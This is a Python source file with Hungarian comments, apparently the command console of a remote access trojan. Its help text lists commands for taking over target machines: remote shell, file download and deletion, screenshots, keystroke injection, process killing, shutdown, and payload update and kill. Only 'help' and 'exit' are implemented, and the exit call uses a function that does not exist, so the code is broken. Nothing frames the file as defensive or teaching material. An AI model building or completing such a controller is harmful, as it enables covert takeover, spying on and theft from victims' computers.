import socket
import threading
#from pathlib import Path
import time
import os


import negnox
import TCPHelper
import Components

helpuzenet = '''//célpontok
target       - beállítja a célpontot
rtarget      - vissza állítja hogy ne legyen célpont
settarget    - grafikus felületű célpont beállítás
lsc          - kilistázza a klienseket
//parancsok amik nem küldenek vissza semmit
setwallpaper - beállít egy hátteret ("")
kys          - le killeli a futó payloadot
update       - le frissíti a futó payloadot
delete       - kitöröl fájlokat ("")
msgbox       - megjelenít egy üzenetet ([])
mousex       - elmozgatja az egeret x tengelyen
mousey       - elmozgatja az egeret y tengelyen
keystroke    - lenyomja az adott gombokat ("")
kill         - bezár futó alkalmazásokat ("")
processS     - elindít egy új Process-t ("")
logoff       - kijelentkezteti a felhasználót
shutdown     - lekapcsolja a gépet
restart      - újraindítja a gépet
audio [100]  - beállítja a hangerőt (itt pl 100-ra)
//lokális parancsok
cdme         - könyvtárat vált ("")
lsme         - ki listázza a könyvtár tartalmát
exet         - átmásol, majd el is indít egy fájlt ("")
clear        - képernyő törlése
logo         - kiírja a logót
help         - kiírja ezt az üzenetet
pwdme        - kijelzi hogy mi a jelenlegi lokális könyvtár
copy         - átmásol fájlokat a CÉLPONT gépére ("" "")     
reload       - újra indítja a listenert
//amik vissza is adnak valamit
cd           - könyvtár változtatás a célpont gépén          [$célpont specifikus!$]
ls           - könyvtár kilistázása a célpont gépén          [$célpont specifikus!$]
pwd          - jelenlegi tartózkodási helye a payloadnak     [$célpont specifikus!$]
download     - letölt a célpont gépéről egy adott fájlt      [$célpont specifikus!$]
grp          - vissza küld jelet hogy még él e a gép         [$célpont specifikus!$]
fsi          - fetch system info                             [$célpont specifikus!$]
frp          - fetch running processes                       [$célpont specifikus!$]
fsc          - fetch screens                                 [$célpont specifikus!$]
screenshot   - csinál egy képernyőképet                      [$célpont specifikus!$]
//beépített programok
rShello      - távolról vezérelhető cmd-t nyit               [$célpont specifikus!$]
             - először telepítés : exet "rSL.exe"
mouseC       - távolról vezérelhető desktop applikáció       [$célpont specifikus!$]
             - először telepítés : exet "MCL.exe"'''

def CheckCommand(x):
    xSplittelve = x.split(" ")
    bemenet = Components.parancsDarabolas(x)
    bemenetek = Components.parameterDarabolas(x)

    #itt jönne a switch case DE EZ PYTHON szoval ifxddd

    command = xSplittelve[0]
    if command == "help":
        print(helpuzenet)
    elif command == "exit":
        os.exit(0)
    else:
        print("ismeretlen parancs!")   

